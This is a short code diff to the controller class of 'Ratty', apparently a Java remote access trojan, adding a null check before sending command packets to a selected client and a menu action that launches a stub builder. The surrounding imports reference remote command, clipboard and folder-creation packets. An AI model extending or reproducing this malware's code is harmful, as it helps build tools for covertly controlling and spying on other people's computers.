@@ -9,6 +9,7 @@ import javax.swing.JOptionPane;
 
 import de.sogomn.rat.ActiveClient;
 import de.sogomn.rat.IClientObserver;
+import de.sogomn.rat.builder.StubBuilder;
 import de.sogomn.rat.packet.ClipboardPacket;
 import de.sogomn.rat.packet.CommandPacket;
 import de.sogomn.rat.packet.CreateFolderPacket;
@@ -248,10 +249,13 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	@Override
 	public void userInput(final String command) {
 		final ServerClient serverClient = gui.getLastServerClientClicked();
-		final IPacket packet = getPacket(command, serverClient);
 		
-		if (packet != null) {
-			serverClient.client.addPacket(packet);
+		if (serverClient != null) {
+			final IPacket packet = getPacket(command, serverClient);
+			
+			if (packet != null) {
+				serverClient.client.addPacket(packet);
+			}
 		}
 		
 		if (command == RattyGui.DESKTOP) {
@@ -264,6 +268,8 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			final FileTreePanel treePanel = serverClient.getTreePanel();
 			
 			treePanel.setVisible(true);
+		} else if (command == RattyGui.BUILD) {
+			StubBuilder.start();
 		}
 	}
 	
